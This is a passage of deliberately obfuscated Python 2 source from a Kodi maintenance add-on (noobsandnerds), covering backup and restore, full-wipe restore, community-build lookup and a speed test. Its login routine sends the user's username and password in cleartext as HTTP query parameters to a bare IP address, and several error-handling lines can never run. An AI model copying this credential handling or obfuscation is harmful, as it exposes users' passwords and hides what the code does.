  if 34 - 34: OoOoOO00 * OoOoOO00
  if 71 - 71: II111iiii . OO0oo0oOO - Oo . I1ii11iIi11i * II111iiii
def OOoo0OOO000o0 ( ) :
 O000OOOoO00OOo = 0
 i1II = xbmcgui . Dialog ( ) . yesno ( 'Full Wipe And New Install' , 'This is a great option if you\'re encountering any issues with your device. This will wipe all your Kodi settings and restore with whatever is in the backup, do you wish to continue?' , nolabel = 'Cancel' , yeslabel = 'Accept' )
 if i1II == 0 :
  return
  if 27 - 27: oo0oooooO0
 elif i1II == 1 :
  O0O0o0o0OOooo = xbmcgui . Dialog ( ) . browse ( 1 , 'Select the backup file you want to restore' , 'files' , '.tar' , False , False , OOOO0OOoO0O0 )
  if O0O0o0o0OOooo == '' :
   O000OOOoO00OOo = 1
   if 35 - 35: oo0oooooO0 + I1IiiI
  if O000OOOoO00OOo == 1 :
   print "### No file selected, quitting restore process ###"
   return
  iI1i1IiIIIIi = os . path . join ( O0Oo000ooO00 , '20141128094249.tar' )
  if not os . path . exists ( O0Oo000ooO00 ) :
   try :
    os . makedirs ( O0Oo000ooO00 )
   except :
    pass
  iiI1IiI . create ( 'Copying File To Restore Folder' , '' , 'Please wait...' )
  shutil . copyfile ( O0O0o0o0OOooo , iI1i1IiIIIIi )
  xbmc . executebuiltin ( 'Reboot' )
  if 78 - 78: oo0oooooO0
  if 15 - 15: oo0oooooO0 + i11iIiiIii % O0 % iI1iiIiiII + OoO0O00 * OOo00O0
def i1I ( ) :
 oOO0o0oo0 ( )
 if I1IIIIiii1i ( ) :
  iIiIIi1 ( '' , '[COLOR=dodgerblue]Restore a locally stored OpenELEC Backup[/COLOR]' , '' , 'restore_local_OE' , 'Restore.png' , '' , '' , 'Restore A Full OE System Backup' )
  if 18 - 18: I1ii11iIi11i
 iIiIIi1 ( '' , '[COLOR=dodgerblue]Restore A Locally stored build[/COLOR]' , 'local' , 'restore_local_CB' , 'Restore.png' , '' , '' , 'Restore A Full System Backup' )
 iIiIIi1 ( '' , '[COLOR=dodgerblue]Restore Local guisettings file[/COLOR]' , 'url' , 'LocalGUIDialog' , 'Restore.png' , '' , '' , 'Back Up Your Full System' )
 if 33 - 33: i11iIiiIii % o0oOOo0O0Ooo . oo0oooooO0 * Oo / iii1I11ii1i1
 if os . path . exists ( os . path . join ( iIo00O , 'addons.zip' ) ) :
  iIiIIi1 ( '' , 'Restore Your Addons' , 'addons' , 'restore_zip' , 'Restore.png' , '' , '' , 'Restore Your Addons' )
  if 25 - 25: OoO0O00
 if os . path . exists ( os . path . join ( iIo00O , 'addon_data.zip' ) ) :
  iIiIIi1 ( '' , 'Restore Your Addon UserData' , 'addon_data' , 'restore_zip' , 'Restore.png' , '' , '' , 'Restore Your Addon UserData' )
  if 39 - 39: OO0oo0oOO * OoOoOO00 + Oo0Ooo . Oo - O0 * I1ii11iIi11i
 if os . path . exists ( os . path . join ( iIo00O , 'guisettings.xml' ) ) :
  iIiIIi1 ( '' , 'Restore Guisettings.xml' , O00o0OO , 'resore_backup' , 'Restore.png' , '' , '' , 'Restore Your guisettings.xml' )
  if 98 - 98: oOoO0o00OO0 * oo0oooooO0 . OoooooooOO . O0
 if os . path . exists ( os . path . join ( iIo00O , 'favourites.xml' ) ) :
  iIiIIi1 ( '' , 'Restore Favourites.xml' , iI , 'resore_backup' , 'Restore.png' , '' , '' , 'Restore Your favourites.xml' )
  if 89 - 89: oo0oooooO0 / O0 % OoooooooOO - O0 . OoO0O00
 if os . path . exists ( os . path . join ( iIo00O , 'sources.xml' ) ) :
  iIiIIi1 ( '' , 'Restore Source.xml' , I1i1I1II , 'resore_backup' , 'Restore.png' , '' , '' , 'Restore Your sources.xml' )
  if 32 - 32: OOo00O0
 if os . path . exists ( os . path . join ( iIo00O , 'advancedsettings.xml' ) ) :
  iIiIIi1 ( '' , 'Restore Advancedsettings.xml' , i1IiIiiI , 'resore_backup' , 'Restore.png' , '' , '' , 'Restore Your advancedsettings.xml' )
  if 26 - 26: O0 * OO0oo0oOO - I1IiiI - oo0oooooO0 / iIii1I11I1II1
 if os . path . exists ( os . path . join ( iIo00O , 'keyboard.xml' ) ) :
  iIiIIi1 ( '' , 'Restore Advancedsettings.xml' , OoOo , 'resore_backup' , 'Restore.png' , '' , '' , 'Restore Your keyboard.xml' )
  if 57 - 57: I1ii11iIi11i - OoO0O00 * iIii1I11I1II1
 if os . path . exists ( os . path . join ( iIo00O , 'RssFeeds.xml' ) ) :
  iIiIIi1 ( '' , 'Restore RssFeeds.xml' , oOO00oOO , 'resore_backup' , 'Restore.png' , '' , '' , 'Restore Your RssFeeds.xml' )
  if 26 - 26: OoO0O00 % OOo00O0 % o0oOOo0O0Ooo % OoOoOO00 . oo0oooooO0 % O0
  if 91 - 91: II111iiii . Oo0Ooo . ooOo - OoooooooOO / OoOoOO00
def I1II1i1iIIi ( url ) :
 III1II1i ( )
 if 'addons' in url :
  ooO0000 = xbmc . translatePath ( os . path . join ( iIo00O , 'addons.zip' ) )
  Ooo00O0OooOOO = Ooo
  if 28 - 28: Oo0Ooo
 else :
  ooO0000 = xbmc . translatePath ( os . path . join ( iIo00O , 'addon_data.zip' ) )
  Ooo00O0OooOOO = OooO0
  if 62 - 62: Oo0Ooo + OoooooooOO / oo0oooooO0
 if 'Backup' in ooO :
  ooOO0OOO00o ( )
  iiI1IiI . create ( "Creating Backup" , "Backing Up" , '' , 'Please Wait' )
  O0OO0 = zipfile . ZipFile ( ooO0000 , 'w' , zipfile . ZIP_DEFLATED )
  O0ooo0o0 = len ( Ooo00O0OooOOO )
  oO0ooOoO = [ ]
  ooO0000o00O = [ ]
  for IiiIiI , iIIIIiiIii , ooO0oo in os . walk ( Ooo00O0OooOOO ) :
   for file in ooO0oo :
    ooO0000o00O . append ( file )
  I1Iii1iI1 = len ( ooO0000o00O )
  for IiiIiI , iIIIIiiIii , ooO0oo in os . walk ( Ooo00O0OooOOO ) :
   for file in ooO0oo :
    oO0ooOoO . append ( file )
    ii1I1I111 = len ( oO0ooOoO ) / float ( I1Iii1iI1 ) * 100
    iiI1IiI . update ( int ( ii1I1I111 ) , "Backing Up" , '[COLOR yellow]%s[/COLOR]' % file , 'Please Wait' )
    Ii1Ii = os . path . join ( IiiIiI , file )
    if not 'temp' in iIIIIiiIii :
     if not I1IiI in iIIIIiiIii :
      import time
      iIiIii1I1II = '01/01/1980'
      O0Oooo = time . strftime ( '%d/%m/%Y' , time . gmtime ( os . path . getmtime ( Ii1Ii ) ) )
      if O0Oooo > iIiIii1I1II :
       O0OO0 . write ( Ii1Ii , Ii1Ii [ O0ooo0o0 : ] )
  O0OO0 . close ( )
  iiI1IiI . close ( )
  O0OoO000O0OO . ok ( "Backup Complete" , "You Are Now Backed Up" , '' , '' )
  if 60 - 60: OO0oo0oOO / OoOoOO00 . iii1I11ii1i1 % Oo
 else :
  iiI1IiI . create ( "Extracting Zip" , "Checking " , '' , 'Please Wait' )
  iiI1IiI . update ( 0 , "" , "Extracting Zip Please Wait" )
  O0OoOoO00O ( ooO0000 , Ooo00O0OooOOO , iiI1IiI )
  time . sleep ( 1 )
  xbmc . executebuiltin ( 'UpdateLocalAddons ' )
  xbmc . executebuiltin ( "UpdateAddonRepos" )
  if 61 - 61: O0 . OO0oo0oOO . O0 * i11iIiiIii * II111iiii / iI1iiIiiII
  if 'Backup' in ooO :
   O0OoO000O0OO . ok ( "Install Complete" , 'Kodi will now close. Just re-open Kodi and wait for all the updates to complete.' )
   o0OOOoOO00o ( )
   if 69 - 69: iii1I11ii1i1
  else :
   O0OoO000O0OO . ok ( "SUCCESS!" , "You Are Now Restored" , '' , '' )
   if 17 - 17: iii1I11ii1i1
   if 38 - 38: iI1iiIiiII % Oo
def iii1I1i ( url ) :
 xbmc . executebuiltin ( 'RunAddon(' + url + ')' )
 if 16 - 16: iI1iiIiiII % iIii1I11I1II1 . i1IIi
 if 72 - 72: OOo00O0 * Oo
def Iiii11IiI ( title ) :
 oOoo0O000 = ''
 oo0O0oOOO0o = xbmc . Keyboard ( oOoo0O000 , title )
 oo0O0oOOO0o . doModal ( )
 if oo0O0oOOO0o . isConfirmed ( ) :
  oOoo0O000 = oo0O0oOOO0o . getText ( ) . replace ( ' ' , '%20' )
  if oOoo0O000 == None :
   return False
 return oOoo0O000
 if 47 - 47: iii1I11ii1i1 * Oo0Ooo - i1IIi . OO0oo0oOO
 if 7 - 7: Oo0Ooo
def O0o0OoO00OO00 ( url ) :
 IiI1Iii1 = Ooooo ( heading = "Search for add-ons" )
 if 7 - 7: iI1iiIiiII - OOo00O0 * ooOo + oOoO0o00OO0
 if ( not IiI1Iii1 ) : return False , 0
 if 96 - 96: i1IIi % I1ii11iIi11i + iIii1I11I1II1
 if 37 - 37: O0
 ooOoO = urllib . quote_plus ( IiI1Iii1 )
 url += ooOoO
 iIiII1iiiiI ( url )
 if 97 - 97: ooOo - OoO0O00 + oo0oooooO0 * O0
 if 55 - 55: i11iIiiIii + i1IIi % II111iiii + iii1I11ii1i1 % OOo00O0
def OO0Oo ( url ) :
 IiI1Iii1 = Ooooo ( heading = "Search for content" )
 if 1 - 1: oo0oooooO0 + I1IiiI . i1IIi
 if 64 - 64: i1IIi . II111iiii + OoooooooOO * o0oOOo0O0Ooo . OoooooooOO
 if ( not IiI1Iii1 ) : return False , 0
 if 7 - 7: iii1I11ii1i1 * iIii1I11I1II1
 if 79 - 79: O0 * iii1I11ii1i1
 ooOoO = urllib . quote_plus ( IiI1Iii1 )
 url += ooOoO
 iIIII1 ( url )
 if 4 - 4: oOoO0o00OO0
 if 43 - 43: i11iIiiIii + o0oOOo0O0Ooo % o0oOOo0O0Ooo * OoooooooOO / iI1iiIiiII
def ii1iOO00O0O00oOOO ( url ) :
 iIII1I111III = 'http://120.24.252.100/TI/Community_Builds/community_builds.php?id=%s' % ( url )
 IIo0o0O0O00oOOo = iIIIiIi ( iIII1I111III ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 I1i1i1iii = re . compile ( 'name="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 iiI1i = re . compile ( 'author="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 ii1iii1i = re . compile ( 'version="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 ooO = I1i1i1iii [ 0 ] if ( len ( I1i1i1iii ) > 0 ) else ''
 I11II1i1 = iiI1i [ 0 ] if ( len ( iiI1i ) > 0 ) else ''
 Oo0 = ii1iii1i [ 0 ] if ( len ( ii1iii1i ) > 0 ) else ''
 O0OoO000O0OO . ok ( ooO , 'Author: [COLOR=dodgerblue]' + I11II1i1 + '[/COLOR]      Latest Version: [COLOR=dodgerblue]' + Oo0 + '[/COLOR]' , '' , 'Click OK to view the build page.' )
 try :
  I1i1II1 ( url + '&visibility=homepage' , url )
 except :
  return
  print "### Could not find build No. " + url
  O0OoO000O0OO . ok ( 'Build Not Found' , 'Sorry we couldn\'t find the build, it may be it\'s marked as private. Please try manually searching via the Community Builds section' )
  if 17 - 17: OOo00O0
  if 25 - 25: OO0oo0oOO * iIii1I11I1II1 * o0oOOo0O0Ooo + OoOoOO00 . OoOoOO00
def IIi1I ( url ) :
 O0OoO000O0OO . ok ( "This build is not complete" , 'The guisettings.xml file was not copied over during the last install process. Click OK to go to the build page and complete Install Step 2 (guisettings fix).' )
 if 19 - 19: O0 * iii1I11ii1i1 % OoooooooOO
 try :
  I1i1II1 ( url + '&visibility=homepage' , url )
  if 36 - 36: o0oOOo0O0Ooo % iii1I11ii1i1 * I1ii11iIi11i % OO0oo0oOO + i1IIi - Oo0Ooo
 except :
  return
  print "### Could not find build No. " + url
  O0OoO000O0OO . ok ( 'Build Not Found' , 'Sorry we couldn\'t find the build, it may be it\'s marked as private. Please try manually searching via the Community Builds section' )
  if 56 - 56: I1ii11iIi11i
  if 32 - 32: OoOoOO00 % O0 % i11iIiiIii - OOo00O0 . I1IiiI
def IIiII1II11i ( ) :
 iIII1I111III = 'http://120.24.252.100/TI/login/login_details.php?user=%s&pass=%s' % ( oo00 , o00 )
 IIo0o0O0O00oOOo = iIIIiIi ( iIII1I111III ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 oooooOOOO0oOo = re . compile ( 'posts="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 iiii1Ii = re . compile ( 'messages="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 IIiiiI = re . compile ( 'unread="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 ii11 = re . compile ( 'email="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 iI1i1i1i1i = iiii1Ii [ 0 ] if ( len ( iiii1Ii ) > 0 ) else ''
 iiII1i1II1iIi = IIiiiI [ 0 ] if ( len ( IIiiiI ) > 0 ) else ''
 iII = ii11 [ 0 ] if ( len ( ii11 ) > 0 ) else ''
 OOOO0o0Oo0 = oooooOOOO0oOo [ 0 ] if ( len ( oooooOOOO0oOo ) > 0 ) else ''
 O0OoO000O0OO . ok ( '[COLOR=orange]noobs[/COLOR][COLOR=dodgerblue]and[/COLOR][COLOR=orange]nerds[/COLOR]' , 'Username:  ' + oo00 , 'Email: ' + iII , 'Unread Messages: ' + iiII1i1II1iIi + '/' + iI1i1i1i1i + '[CR]Posts: ' + OOOO0o0Oo0 )
 if 27 - 27: oo0oooooO0 % Oo0Ooo . I1ii11iIi11i . i1IIi % OoOoOO00 . o0oOOo0O0Ooo
 if 37 - 37: oo0oooooO0 + iI1iiIiiII * OO0oo0oOO + oOoO0o00OO0
def I1i ( url , type ) :
 if type == 'communitybuilds' :
  IiIIIii1iIII1 = 'grab_builds'
  if url . endswith ( "visibility=premium" ) :
   iIiIIi1 ( 'folder' , '[COLOR=yellow]Manual Search[/COLOR]' , '&reseller=' + urllib . quote ( I1IiiI ) + '&token=' + IIi1IiiiI1Ii + '&visibility=premium' , 'manual_search' , 'Manual_Search.png' , '' , '' , '' )
  if url . endswith ( "visibility=reseller_private" ) :
   iIiIIi1 ( 'folder' , '[COLOR=yellow]Manual Search[/COLOR]' , '&reseller=' + urllib . quote ( I1IiiI ) + '&token=' + IIi1IiiiI1Ii + '&visibility=reseller_private' , 'manual_search' , 'Manual_Search.png' , '' , '' , '' )
  if url . endswith ( "visibility=public" ) :
   iIiIIi1 ( 'folder' , '[COLOR=yellow]Manual Search[/COLOR]' , '&visibility=public' , 'manual_search' , 'Manual_Search.png' , '' , '' , '' )
  if url . endswith ( "visibility=private" ) :
   iIiIIi1 ( 'folder' , '[COLOR=yellow]Manual Search[/COLOR]' , '&visibility=private' , 'manual_search' , 'Manual_Search.png' , '' , '' , '' )
 if type == 'tutorials' :
  IiIIIii1iIII1 = 'grab_tutorials'
 if type == 'hardware' :
  IiIIIii1iIII1 = 'grab_hardware'
 if type == 'addons' :
  IiIIIii1iIII1 = 'grab_addons'
  iIiIIi1 ( 'folder' , '[COLOR=dodgerblue]Sort by Most Popular[/COLOR]' , str ( url ) + '&sortx=downloads&orderx=DESC' , IiIIIii1iIII1 , 'Popular.png' , '' , '' , '' )
 if type == 'hardware' :
  iIiIIi1 ( 'folder' , '[COLOR=lime]Filter Results[/COLOR]' , url , 'hardware_filter_menu' , 'Filter.png' , '' , '' , '' )
 if type != 'addons' :
  iIiIIi1 ( 'folder' , '[COLOR=dodgerblue]Sort by Most Popular[/COLOR]' , str ( url ) + '&sortx=downloadcount&orderx=DESC' , IiIIIii1iIII1 , 'Popular.png' , '' , '' , '' )
 if type == 'tutorials' or type == 'hardware' :
  iIiIIi1 ( 'folder' , '[COLOR=dodgerblue]Sort by Newest[/COLOR]' , str ( url ) + '&sortx=Added&orderx=DESC' , IiIIIii1iIII1 , 'Latest.png' , '' , '' , '' )
 else :
  iIiIIi1 ( 'folder' , '[COLOR=dodgerblue]Sort by Newest[/COLOR]' , str ( url ) + '&sortx=created&orderx=DESC' , IiIIIii1iIII1 , 'Latest.png' , '' , '' , '' )
  iIiIIi1 ( 'folder' , '[COLOR=dodgerblue]Sort by Recently Updated[/COLOR]' , str ( url ) + '&sortx=updated&orderx=DESC' , IiIIIii1iIII1 , 'Recently_Updated.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , '[COLOR=dodgerblue]Sort by A-Z[/COLOR]' , str ( url ) + '&sortx=name&orderx=ASC' , IiIIIii1iIII1 , 'AtoZ.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , '[COLOR=dodgerblue]Sort by Z-A[/COLOR]' , str ( url ) + '&sortx=name&orderx=DESC' , IiIIIii1iIII1 , 'ZtoA.png' , '' , '' , '' )
 if type == 'public_CB' :
  iIiIIi1 ( 'folder' , '[COLOR=dodgerblue]Sort by Genre[/COLOR]' , url , 'genres' , 'Search_Genre.png' , '' , '' , '' )
  iIiIIi1 ( 'folder' , '[COLOR=dodgerblue]Sort by Country/Language[/COLOR]' , url , 'countries' , 'Search_Country.png' , '' , '' , '' )
  if 69 - 69: i1IIi / i11iIiiIii + Oo0Ooo - OoOoOO00
  if 13 - 13: oOoO0o00OO0 . iIii1I11I1II1
def iIi1 ( ) :
 Ii1Ii1IiIIIi1 ( 'Speed Test Instructions' , '[COLOR=blue][B]What file should I use: [/B][/COLOR][CR]This function will download a file and will work out your speed based on how long it took to download. You will then be notified of '
 'what quality streams you can expect to stream without buffering. You can choose to download a 10MB, 16MB, 32MB, 64MB or 128MB file to use with the test. Using the larger files will give you a better '
 'indication of how reliable your speeds are but obviously if you have a limited amount of bandwidth allowance you may want to opt for a smaller file.'
 '[CR][CR][COLOR=blue][B]How accurate is this speed test:[/B][/COLOR][CR]Not very accurate at all! As this test is based on downloading a file from a server it\'s reliant on the server not having a go-slow day '
 'but the servers used should be pretty reliable. The 10MB file is hosted on a different server to the others so if you\'re not getting the results expected please try another file. If you have a fast fiber '
 'connection the chances are your speed will show as considerably slower than your real download speed due to the server not being able to send the file as fast as your download speed allows. Essentially the '
 'test results will be limited by the speed of the server but you will at least be able to see if it\'s your connection that\'s causing buffering or if it\'s the host you\'re trying to stream from'
 '[CR][CR][COLOR=blue][B]What is the differnce between Live Streams and Online Video:[/COLOR][/B][CR]When you run the test you\'ll see results based on your speeds and these let you know the quality you should expect to '
 'be able stream with your connection. Live Streams as the title suggests are like traditional TV channels, they are being streamed live so for example if you wanted to watch CNN this would fall into this category. '
 'Online Videos relates to movies, tv shows, youtube clips etc. Basically anything that isn\'t live - if you\'re new to the world of streaming then think of it as On Demand content, this is content that\'s been recorded and stored on the web.'
 '[CR][CR][COLOR=blue][B]Why am I still getting buffering:[/COLOR][/B][CR]The results you get from this test are strictly based on your download speed, there are many other factors that can cause buffering and contrary to popular belief '
 'having a massively fast internet connection will not make any difference to your buffering issues if the server you\'re trying to get the content from is unable to send it fast enough. This can often happen and is usually '
 'down to heavy traffic (too many users accessing the same server). A 10 Mb/s connection should be plenty fast enough for almost all content as it\'s very rare a server can send it any quicker than that.'
 '[CR][CR][COLOR=blue][B]What\'s the difference between MB/s and Mb/s:[/COLOR][/B][CR]A lot of people think the speed they see advertised by their ISP is Megabytes (MB/S) per second - this is not true. Speeds are usually shown as Mb/s '
 'which is Megabit per second - there are 8 of these to a megabyte so if you want to work out how many megabytes per second you\'re getting you need to divide the speed by 8. It may sound sneaky but really it\'s just the unit that has always been used.'
 '[CR][CR]A direct link to the buffering thread explaining what you can do to improve your viewing experience can be found at [COLOR=yellow]http://bit.ly/bufferingfix[/COLOR]'
 '[CR][CR]Thank you, [COLOR=orange]noobs[/COLOR][COLOR=dodgerblue]and[/COLOR][COLOR=orange]nerds[/COLOR] Team.' )
 if 35 - 35: II111iiii % Oo . ooOo * OOo00O0
def o0O00ooo0oO0o ( ) :
 iIiIIi1 ( '' , '[COLOR=blue]Instructions - Read me first[/COLOR]' , 'none' , 'speed_instructions' , 'howto.png' , '' , '' , '' )
 iIiIIi1 ( '' , 'Download 16MB file   - [COLOR=lime]Server 1[/COLOR]' , 'https://totalrevolution.googlecode.com/svn/trunk/download%20files/16MB.txt' , 'runtest' , 'Download16.png' , '' , '' , '' )
 iIiIIi1 ( '' , 'Download 32MB file   - [COLOR=lime]Server 1[/COLOR]' , 'https://totalrevolution.googlecode.com/svn/trunk/download%20files/32MB.txt' , 'runtest' , 'Download32.png' , '' , '' , '' )
 iIiIIi1 ( '' , 'Download 64MB file   - [COLOR=lime]Server 1[/COLOR]' , 'https://totalrevolution.googlecode.com/svn/trunk/download%20files/64MB.txt' , 'runtest' , 'Download64.png' , '' , '' , '' )
 iIiIIi1 ( '' , 'Download 128MB file - [COLOR=lime]Server 1[/COLOR]' , 'https://totalrevolution.googlecode.com/svn/trunk/download%20files/128MB.txt' , 'runtest' , 'Download128.png' , '' , '' , '' )
 iIiIIi1 ( '' , 'Download 10MB file   - [COLOR=yellow]Server 2[/COLOR]' , 'http://www.wswd.net/testdownloadfiles/10MB.zip' , 'runtest' , 'Download10.png' , '' , '' , '' )
 if 21 - 21: iIii1I11I1II1 / OOo00O0 * iI1iiIiiII
 if 98 - 98: O0 + o0oOOo0O0Ooo
def Ii1Ii1IiIIIi1 ( heading , anounce ) :
 class i11i ( ) :
  WINDOW = 10147
  CONTROL_LABEL = 1
  CONTROL_TEXTBOX = 5
  def __init__ ( self , * args , ** kwargs ) :
   xbmc . executebuiltin ( "ActivateWindow(%d)" % ( self . WINDOW , ) )
   self . win = xbmcgui . Window ( self . WINDOW )
   xbmc . sleep ( 500 )
   self . setControls ( )
  def setControls ( self ) :
   self . win . getControl ( self . CONTROL_LABEL ) . setLabel ( heading )
   try : ooOo0O0o0 = open ( anounce ) ; IIII1II11Iii = ooOo0O0o0 . read ( )
   except : IIII1II11Iii = anounce
   self . win . getControl ( self . CONTROL_TEXTBOX ) . setText ( str ( IIII1II11Iii ) )
   return
 i11i ( )
 while xbmc . getCondVisibility ( 'Window.IsVisible(textviewer)' ) :
  xbmc . sleep ( 500 )
  if 46 - 46: OO0oo0oOO * OO0oo0oOO / ooOo * iI1iiIiiII
  if 37 - 37: OoOoOO00 + oOoO0o00OO0
def II1iiiiIIO000ooO0 ( name , url ) :
 Ii1Ii1IiIIIi1 ( name , url )
 if 60 - 60: I1ii11iIi11i * Oo0Ooo
 if 85 - 85: i1IIi * OoOoOO00
def O00OIiIIiIiIIiI ( ) :
 o00oO0 = time . time ( )
 IIIi111iii1iI = time . localtime ( o00oO0 )
 return time . strftime ( '%Y%m%d%H%M%S' , IIIi111iii1iI )
 if 23 - 23: OOo00O0 / i11iIiiIii % Oo - iI1iiIiiII . oo0oooooO0
 if 92 - 92: iIii1I11I1II1
def I1iii1I11i1I1iII ( ) :
 iIiIIi1 ( '' , '[COLOR=orange]noobs[/COLOR][COLOR=dodgerblue]and[/COLOR][COLOR=orange]nerds[/COLOR] Keyword Install' , O00O0oOO00O00 , 'keywords' , 'Keywords.png' , '' , '' , '' )
 if I1IIIIiii1i ( ) :
  iIiIIi1 ( '' , '[COLOR=darkcyan]Wi-Fi Settings[/COLOR]' , '' , 'openelec_settings' , 'Wi-Fi.png' , '' , '' , '' )
  if 17 - 17: i11iIiiIii % OO0oo0oOO - oo0oooooO0 * i1IIi
  if 45 - 45: OoO0O00 - OoooooooOO / OoOoOO00
  if 12 - 12: i11iIiiIii - iii1I11ii1i1 % oo0oooooO0 % O0 * Oo0Ooo * ooOo
 iIiIIi1 ( 'folder' , '[COLOR=dodgerblue]Add-on Maintenance/Fixes[/COLOR]' , 'none' , 'addonfixes' , 'Addon_Fixes.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , '[COLOR=dodgerblue]Backup/Restore My Content[/COLOR]' , 'none' , 'backup_restore' , 'Backup.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , '[COLOR=dodgerblue]Clean/Wipe Options[/COLOR]' , 'none' , 'wipetools' , 'Addon_Fixes.png' , '' , '' , '' )
 iIiIIi1 ( '' , 'Check My IP Address' , 'none' , 'ipcheck' , 'Check_IP.png' , '' , '' , '' )
 iIiIIi1 ( '' , 'Check XBMC/Kodi Version' , 'none' , 'xbmcversion' , 'Version_Check.png' , '' , '' , '' )
 iIiIIi1 ( '' , 'Convert Physical Paths To Special' , II , 'fix_special' , 'Special_Paths.png' , '' , '' , '' )
 iIiIIi1 ( '' , 'Force Close Kodi' , 'url' , 'kill_xbmc' , 'Kill_XBMC.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Test My Download Speed' , 'none' , 'speedtest_menu' , 'Speed_Test.png' , '' , '' , '' )
 iIiIIi1 ( '' , 'Upload Log' , 'none' , 'uploadlog' , 'Log_File.png' , '' , '' , '' )
 iIiIIi1 ( '' , 'View My Log' , 'none' , 'log' , 'View_Log.png' , '' , '' , '' )
 if 66 - 66: i11iIiiIii
 if 16 - 16: iIii1I11I1II1 / I1IiiI / iI1iiIiiII - i11iIiiIii . OOo00O0 / Oo
def IIIi11iiIIi ( url ) :
 iIiIIi1 ( 'folder' , '[COLOR=yellow]1. Add-on Maintenance[/COLOR]' , str ( url ) + '&type=Maintenance' , 'grab_tutorials' , 'Maintenance.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Audio Add-ons' , str ( url ) + '&type=Audio' , 'grab_tutorials' , 'Audio.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Picture Add-ons' , str ( url ) + '&type=Pictures' , 'grab_tutorials' , 'Pictures.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Program Add-ons' , str ( url ) + '&type=Programs' , 'grab_tutorials' , 'Programs.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Video Add-ons' , str ( url ) + '&type=Video' , 'grab_tutorials' , 'Video.png' , '' , '' , '' )
 if 78 - 78: ooOo % OoooooooOO
 if 73 - 73: I1IiiI % OOo00O0 % oOoO0o00OO0 + i1IIi - OoooooooOO / ooOo
def ooOOoOO000 ( url ) :
 iiii1I1 = 'http://noobsandnerds.com/TI/TutorialPortal/downloadcount.php?id=%s' % ( url )
 iIIIiIi ( iiii1I1 )
 iIII1I111III = 'http://noobsandnerds.com/TI/TutorialPortal/tutorialdetails.php?id=%s' % ( url )
 IIo0o0O0O00oOOo = iIIIiIi ( iIII1I111III ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 I1i1i1iii = re . compile ( 'name="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 iiI1i = re . compile ( 'author="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 IiIi1Ii = re . compile ( 'video_guide1="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 iiIIiI11II1 = re . compile ( 'video_guide2="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 oooOo = re . compile ( 'video_guide3="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 oOoO0Oo0 = re . compile ( 'video_guide4="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 i11i11i = re . compile ( 'video_guide5="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 iiI1iI = re . compile ( 'video_label1="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 Ooo00O0 = re . compile ( 'video_label2="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 OoO0OOoO0 = re . compile ( 'video_label3="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 iiI11i = re . compile ( 'video_label4="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 o0Oo = re . compile ( 'video_label5="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 oOO0 = re . compile ( 'about="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 i1i1iIi1IiI = re . compile ( 'step1="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 i11i11Iii = re . compile ( 'step2="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 OO0o00Oo0oo0 = re . compile ( 'step3="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 I11Oo0O00O0O00 = re . compile ( 'step4="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 II1I1i = re . compile ( 'step5="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 O00OoOo0OooOo = re . compile ( 'step6="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 OOooOoOOo0O = re . compile ( 'step7="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 IIi11ii = re . compile ( 'step8="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 OOOO0oO0OOo0o = re . compile ( 'step9="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 OoOO = re . compile ( 'step10="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 iiiiI = re . compile ( 'step11="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 ooo0O0O0OO = re . compile ( 'step12="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 oOooOOoO = re . compile ( 'step13="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 o0o000OOO = re . compile ( 'step14="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 I1111iii1ii11 = re . compile ( 'step15="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 OoOooOo00o = re . compile ( 'screenshot1="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 iI1IIi = re . compile ( 'screenshot2="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 II11oo0o0O = re . compile ( 'screenshot3="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 ooo0ooooo0o = re . compile ( 'screenshot4="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 IIIII = re . compile ( 'screenshot5="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 Ii1IIi1I11i = re . compile ( 'screenshot6="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
